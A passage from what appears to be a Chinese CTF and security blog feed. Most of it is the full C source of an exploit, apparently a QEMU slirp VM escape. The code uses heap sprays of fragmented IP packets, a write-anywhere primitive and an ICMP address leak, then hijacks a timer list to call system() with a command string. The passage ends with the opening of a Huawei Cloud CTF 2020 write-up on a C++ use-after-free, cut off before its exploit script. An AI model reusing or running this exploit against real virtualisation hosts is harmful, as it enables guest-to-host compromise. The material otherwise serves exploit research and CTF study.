class="hljs-keyword">sizeof</span>(ifr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(sendto(sd, packet, payload_len + IP4_HDRLEN, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] sendto failed. ---send_ip_pkt&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    close(sd);<br><br>    <span class="hljs-built_in">free</span>(packet);<br>    <span class="hljs-built_in">free</span>(source_ip);<br>    <span class="hljs-built_in">free</span>(destion_ip);<br>    <span class="hljs-built_in">free</span>(interface);<br>    <span class="hljs-built_in">free</span>(ip_flags);<br>    <span class="hljs-built_in">free</span>(tcp_flags);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_anywhere</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">int</span> addr_len, <span class="hljs-type">uint8_t</span>* write_any_data, <span class="hljs-type">int</span> write_any_data_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(<span class="hljs-number">113</span>);<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket create failed. ---write_anywhere&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(connect(sd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] connect failed. ---write_anywhere&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info</span>;</span><br>    pkt_info.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info.ip_off = <span class="hljs-number">0</span>;<br>    pkt_info.ip_p = <span class="hljs-number">0xFF</span>;<br>    pkt_info.MF = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> payload_len = <span class="hljs-number">0x400</span>;<br>    <span class="hljs-type">uint8_t</span> *payload = malloc_8(payload_len);<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-string">&#x27;a&#x27;</span>, payload_len);<br>    send_ip_pkt(&amp;pkt_info, payload, payload_len);<br><br>    <span class="hljs-comment">/* prapare write any data */</span><br>    <span class="hljs-type">uint8_t</span> *write_data = malloc_8(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">uint8_t</span> *write_data_8 = write_data;<br>    <span class="hljs-type">uint8_t</span> *write_data_start = write_data;<br>    <span class="hljs-type">uint16_t</span> *write_data_16 = (<span class="hljs-type">uint16_t</span> *)write_data;<br>    <span class="hljs-type">uint32_t</span> *write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data;<br>    <span class="hljs-type">uint64_t</span> *write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data;<br>    <span class="hljs-built_in">memset</span>(write_data, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x6</span>; j++)&#123;<br>        write(sd, write_data, <span class="hljs-number">0x500</span>);<br>        <span class="hljs-comment">//sleep(0.2);</span><br>        <span class="hljs-comment">//printf(&quot;write data, time %d\n&quot;,j+1);</span><br>    &#125;<br>    write(sd, write_data, <span class="hljs-number">0x430</span>);<br>    <br><br>    *write_data_64++ = <span class="hljs-number">0</span>;<br>    *write_data_64++ = <span class="hljs-number">0x675</span>; <span class="hljs-comment">// chunk header</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_next</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prev</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_nextpkt</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prevpkt</span><br>    write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data_64;<br>    *write_data_32++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_flags</span><br>    *write_data_32++ = <span class="hljs-number">0x608</span>; <span class="hljs-comment">// m_size</span><br>    write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data_32;<br>    *write_data_64++ = <span class="hljs-number">0</span>; <span class="hljs-comment">// m_so</span><br>    write_data_8 = (<span class="hljs-type">uint8_t</span> *)write_data_64;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; addr_len; k++)&#123;<br>        *write_data_8++ = ((addr) &gt;&gt; (k*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-comment">//m_data</span><br>    &#125;<br><br>    write(sd, write_data_start, <span class="hljs-number">0x40</span> + addr_len);<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info_cat</span>;</span><br>    pkt_info_cat.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info_cat.ip_off = <span class="hljs-number">0x400</span>;<br>    pkt_info_cat.ip_p = <span class="hljs-number">0xFF</span>;<br>    pkt_info_cat.MF = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// if(stop_flag)&#123;</span><br>    <span class="hljs-comment">//    getchar();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    send_ip_pkt(&amp;pkt_info_cat, write_any_data, write_any_data_len);<br><br>    <span class="hljs-built_in">free</span>(payload);<br>    <span class="hljs-built_in">free</span>(write_data);<br>    close(sd);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">int</span> addr_len)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br>    <span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br>    <span class="hljs-built_in">sin</span>.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    <span class="hljs-built_in">sin</span>.sin_port = htons(<span class="hljs-number">113</span>);<br><br>    <span class="hljs-type">int</span> sd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] socket create failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(connect(sd, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;<span class="hljs-built_in">sin</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] connect failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info</span>;</span><br>    pkt_info.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info.ip_off = <span class="hljs-number">0x0</span>;<br>    pkt_info.ip_p = IPPROTO_ICMP;<br>    pkt_info.MF = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> payload_len = <span class="hljs-number">0x400</span>;<br>    <span class="hljs-type">uint8_t</span> *payload = malloc_8(payload_len);<br>    <span class="hljs-built_in">memset</span>(payload, <span class="hljs-string">&#x27;A&#x27;</span>, payload_len);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] send icmp 1 part.\n&quot;</span>);<br>    send_ip_pkt(&amp;pkt_info, payload, payload_len);<br><br>    <span class="hljs-comment">/* prapare write any data */</span><br>    <span class="hljs-type">uint8_t</span> *write_data = malloc_8(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">uint8_t</span> *write_data_8 = write_data;<br>    <span class="hljs-type">uint8_t</span> *write_data_start = write_data;<br>    <span class="hljs-type">uint16_t</span> *write_data_16 = (<span class="hljs-type">uint16_t</span> *)write_data;<br>    <span class="hljs-type">uint32_t</span> *write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data;<br>    <span class="hljs-type">uint64_t</span> *write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data;<br>    <span class="hljs-built_in">memset</span>(write_data, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">0x500</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x6</span>; j++)&#123;<br>        write(sd, write_data, <span class="hljs-number">0x500</span>);<br>        <span class="hljs-comment">//sleep(0.2);</span><br>        <span class="hljs-comment">//printf(&quot;write data, time %d\n&quot;,j+1);</span><br>    &#125;<br>    write(sd, write_data, <span class="hljs-number">0x430</span>);<br>    <br><br>    *write_data_64++ = <span class="hljs-number">0</span>;<br>    *write_data_64++ = <span class="hljs-number">0x675</span>; <span class="hljs-comment">// chunk header</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_next</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prev</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_nextpkt</span><br>    *write_data_64++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_prevpkt</span><br>    write_data_32 = (<span class="hljs-type">uint32_t</span> *)write_data_64;<br>    *write_data_32++ = <span class="hljs-number">0</span>;     <span class="hljs-comment">// m_flags</span><br>    *write_data_32++ = <span class="hljs-number">0x608</span>; <span class="hljs-comment">// m_size</span><br>    write_data_64 = (<span class="hljs-type">uint64_t</span> *)write_data_32;<br>    *write_data_64++ = <span class="hljs-number">0</span>; <span class="hljs-comment">// m_so</span><br>    write_data_8 = (<span class="hljs-type">uint8_t</span> *)write_data_64;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; addr_len; k++)&#123;<br>        *write_data_8++ = ((addr) &gt;&gt; (k*<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>; <span class="hljs-comment">//m_data</span><br>    &#125;<br><br>    write(sd, write_data_start, <span class="hljs-number">0x40</span> + addr_len);<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip_pkt_info</span> <span class="hljs-title">pkt_info_2</span>;</span><br>    pkt_info_2.ip_id = <span class="hljs-number">0xdead</span>;<br>    pkt_info_2.ip_off = <span class="hljs-number">0x400</span>;<br>    pkt_info_2.ip_p = IPPROTO_ICMP;<br>    pkt_info_2.MF = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> payload_len_2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> recv_sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));<br>    <span class="hljs-keyword">if</span>(recv_sd &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;socket recv failed. ---leak.&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <br>    send_ip_pkt(&amp;pkt_info_2, payload, payload_len_2);<br><br>    <span class="hljs-comment">// if(stop_flag)&#123;</span><br>    <span class="hljs-comment">//    getchar();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-type">int</span> recv_flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">int</span> recv_size;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">recv_ip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmp</span> *<span class="hljs-title">recv_icmp</span>;</span><br>    <span class="hljs-type">uint8_t</span> recv_buf[IP_MAXPACKET];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">recv_sin</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;recv_sin, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(recv_sin));<br>    <span class="hljs-type">socklen_t</span> sock_addr_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">wait</span>, <span class="hljs-title">t1</span>, <span class="hljs-title">t2</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timezone</span> <span class="hljs-title">tz</span>;</span><br>    <span class="hljs-type">double</span> tt;<br> <br>    (<span class="hljs-type">void</span>)gettimeofday(&amp;t1, &amp;tz);<br>    wait.tv_sec = <span class="hljs-number">3</span>;                              <span class="hljs-comment">// 3 secends timeout.</span><br>    wait.tv_usec = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(setsockopt(recv_sd, SOL_SOCKET, SO_RCVTIMEO, (<span class="hljs-type">char</span> *)&amp;wait, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> timeval)) &lt; <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;[*] setsockopt timeout failed. ---leak&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    recv_ip = (<span class="hljs-keyword">struct</span> ip *)(recv_buf + ETH_HDRLEN);<br>    recv_icmp = (<span class="hljs-keyword">struct</span> icmp *)(recv_buf + ETH_HDRLEN + IP4_HDRLEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] start to recvfrom data.\n&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-built_in">memset</span>(recv_buf, <span class="hljs-number">0</span>, IP_MAXPACKET*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint8_t</span>));<br>        <span class="hljs-built_in">memset</span>(&amp;recv_sin, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));<br>        <span class="hljs-keyword">if</span>((recv_size = recvfrom(recv_sd, recv_buf, IP_MAXPACKET, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;recv_sin, &amp;sock_addr_len)) &lt;= <span class="hljs-number">0</span>)&#123;<br>            status = errno;<br>            <span class="hljs-keyword">if</span>(status == EAGAIN)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] No replay within %li seconds. ---leak\n&quot;</span>,wait.tv_sec);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                perror(<span class="hljs-string">&quot;[*] recvfrom() failed&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span>((((recv_buf[<span class="hljs-number">12</span>] &lt;&lt; <span class="hljs-number">8</span>) + (recv_buf[<span class="hljs-number">13</span>])) == ETH_P_IP )&amp;&amp;<br>            (recv_ip-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;<br>            (recv_icmp-&gt;icmp_type == ICMP_ECHOREPLY))&#123;<br>                (<span class="hljs-type">void</span>)gettimeofday(&amp;t2,&amp;tz);<br>                tt = (<span class="hljs-type">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="hljs-number">1000.0</span> + (<span class="hljs-type">double</span>)(t2.tv_usec - t1.tv_usec)/<span class="hljs-number">1000.0</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%g ms (%i bytes recvived)\n&quot;</span>,tt,recv_size);<br>                <span class="hljs-keyword">if</span>(recv_size &lt; <span class="hljs-number">0x200</span>)&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;   <br>    &#125;<br><br>    <span class="hljs-comment">// for(int i = 0; i &lt; 0x200 / 8; i = i + 2)&#123;</span><br>    <span class="hljs-comment">//     printf(&quot;%#lx %#lx\n&quot;, *(uint64_t*)(recv_buf + i * 8), *(uint64_t*)(recv_buf + (i+1) * 8));</span><br>    <span class="hljs-comment">// &#125;</span><br>    heap_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">13</span> * <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xffffffffff000000</span>;<br>    elf_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">16</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">0x463099</span>;<br>    main_thread_heap_base = *(<span class="hljs-type">uint64_t</span>*)(recv_buf + <span class="hljs-number">17</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">0x132d10</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_base_is %#lx\n&quot;</span>, heap_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_is %#lx\n&quot;</span>, elf_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_main_thread_heap_addr_is %#lx\n&quot;</span>, main_thread_heap_base);<br><br><br>    <span class="hljs-built_in">free</span>(payload);<br>    <span class="hljs-built_in">free</span>(write_data);<br>    close(sd);<br>    close(recv_sd);<br>&#125;<br><br><span class="hljs-type">uint8_t</span> buf[IP_MAXPACKET];<br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//system(&quot;ip link set dev enp0s3 mtu 9000&quot;);</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> eth_frame[] =<br>        <span class="hljs-string">&quot;\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00&quot;</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">icmp</span> *<span class="hljs-title">icmphdr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ip</span> *<span class="hljs-title">iphdr</span>;</span><br>    <br>    <span class="hljs-type">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);<br>    iphdr = (<span class="hljs-keyword">struct</span> ip *)(buf + ETH_HDRLEN);<br>    <span class="hljs-built_in">strcpy</span>(src_ip, <span class="hljs-string">&quot;10.0.2.15&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(dst_ip, <span class="hljs-string">&quot;10.0.2.2&quot;</span>);<br>    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>);<br>    iphdr-&gt;ip_v = <span class="hljs-number">4</span>;<br>    iphdr-&gt;ip_tos = <span class="hljs-number">0</span>;<br>    iphdr-&gt;ip_len = ICMP_HDRLEN;<br>    iphdr-&gt;ip_id = <span class="hljs-number">0xcdcd</span>;<br>    <span class="hljs-comment">// Zero (1 bit)</span><br>    <span class="hljs-comment">// Do not fragment flag (1 bit)</span><br>    <span class="hljs-comment">// More fragments following flag (1 bit)</span><br>    <span class="hljs-comment">// Fragmentation offset (13 bits)</span><br>    iphdr-&gt;ip_off = ((<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">15</span>) + (<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">14</span>) + (<span class="hljs-number">0</span> &lt;&lt; <span class="hljs-number">13</span>) + (<span class="hljs-number">0</span> &gt;&gt; <span class="hljs-number">3</span>));<br>    iphdr-&gt;ip_ttl = <span class="hljs-number">255</span>;<br>    iphdr-&gt;ip_p = IPPROTO_ICMP;<br>    inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src));<br>    inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst));<br>    iphdr-&gt;ip_sum = <span class="hljs-number">0</span>;<br>    iphdr-&gt;ip_sum = checksum((<span class="hljs-type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);<br><br>    icmphdr = (<span class="hljs-keyword">struct</span> icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);<br>    icmphdr-&gt;icmp_type = <span class="hljs-number">8</span>;<br>    icmphdr-&gt;icmp_code = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_id = <span class="hljs-number">0x1234</span>;<br>    icmphdr-&gt;icmp_seq = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_cksum = <span class="hljs-number">0</span>;<br>    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> write_data_len = ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN;<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 1: Write the icmp_data to heap&quot;);</span><br>    <span class="hljs-comment">//puts(&quot;[*] Start First Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xaabb</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br>    write_anywhere(<span class="hljs-number">0xae0</span> - <span class="hljs-number">0x400</span>, <span class="hljs-number">3</span>, buf, write_data_len);<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 2: Recv icmp_package and leak addr&quot;);</span><br>    <span class="hljs-comment">//puts(&quot;[*] Start Second Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xccdd</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br>    leak(<span class="hljs-number">0xae0</span> + ETH_HDRLEN + IP4_HDRLEN, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2a7390</span>;<br>    <span class="hljs-type">size_t</span> main_loop_tlg = elf_base + <span class="hljs-number">0x100d340</span>;<br><br>    <span class="hljs-comment">//puts(&quot;[*]STEP 3: Hijack the main_loop_tlg&quot;);</span><br>    <span class="hljs-type">size_t</span> fake_timerlist_addr = heap_base + <span class="hljs-number">0x1020</span>;<br>    <span class="hljs-type">size_t</span> fake_timerlist[<span class="hljs-number">14</span>];<br>    <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = main_loop_tlg + <span class="hljs-number">0x20</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0x100000000</span>;<br>    fake_timerlist[j++] = heap_base + <span class="hljs-number">0x1020</span> + <span class="hljs-number">0x70</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = main_loop_tlg;<br>    fake_timerlist[j++] = elf_base + <span class="hljs-number">0x2f8a34</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0</span>;<br>    fake_timerlist[j++] = <span class="hljs-number">0x100000000</span>;<br><br>    <span class="hljs-type">size_t</span> fake_timer[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">size_t</span> cmd_addr = heap_base + <span class="hljs-number">0x1020</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x40</span>;<br>    j = <span class="hljs-number">0</span>;<br>    fake_timer[j++] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    fake_timer[j++] = heap_base + <span class="hljs-number">0x1020</span>;<br>    fake_timer[j++] = system_plt;<br>    fake_timer[j++] = cmd_addr;<br>    fake_timer[j++] = <span class="hljs-number">0</span>;<br>    fake_timer[j++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(buf, fake_timerlist, <span class="hljs-number">0x70</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x70</span>, fake_timer, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x40</span>, cmd, <span class="hljs-number">0x40</span>);<br><br>    <span class="hljs-comment">//puts(&quot;[*] Start Third Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xeeff</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br><br>    write_anywhere(fake_timerlist_addr - <span class="hljs-number">0x400</span>, <span class="hljs-number">8</span>, buf, <span class="hljs-number">0xf0</span>);<br><br>    <span class="hljs-comment">//puts(&quot;[*] Start Fourth Spray&quot;);</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x30</span>; ++i)&#123;<br>        spray(<span class="hljs-number">0xffee</span> + i, <span class="hljs-number">0x5dc</span>);<br>        <span class="hljs-comment">//printf(&quot;Spray time %d.\n&quot;,i + 1);</span><br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(buf, &amp;fake_timerlist_addr, <span class="hljs-number">8</span>);<br>    write_anywhere(main_loop_tlg - <span class="hljs-number">0x400</span>, <span class="hljs-number">8</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后效果如下：</p><img src="/img/20/Screenshot 2023-10-06 205655.png" style="zoom: 67%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>华为云ctf2020</title>
    <link href="/2023/09/25/hwctf2020/"/>
    <url>/2023/09/25/hwctf2020/</url>
    
    <content type="html"><![CDATA[<p>最近研究angr在pwn题中的应用，发现到了2020年华为云ctf中就有这种类型的题，后来发现这场比赛中其它题目的出题点也很有意思，感觉也有必要复现一下。</p><p>参考：<a href="https://www.wolai.com/ctfhub/2ndDeVF7APBfhEndoMJccF">https://www.wolai.com/ctfhub/2ndDeVF7APBfhEndoMJccF</a>    、 <a href="https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020">https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020</a></p><p>​                        </p><h3 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h3><p>C++的堆题，没用STL这些东西（出题人太良心了），白给的uaf，可以直接泄漏地址、修改堆内存</p><img src="/img/19/Screenshot 2023-09-24 203442.png" style="zoom: 67%;" /><p>​                                     </p><p>剩下的就没什么可说的了，完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 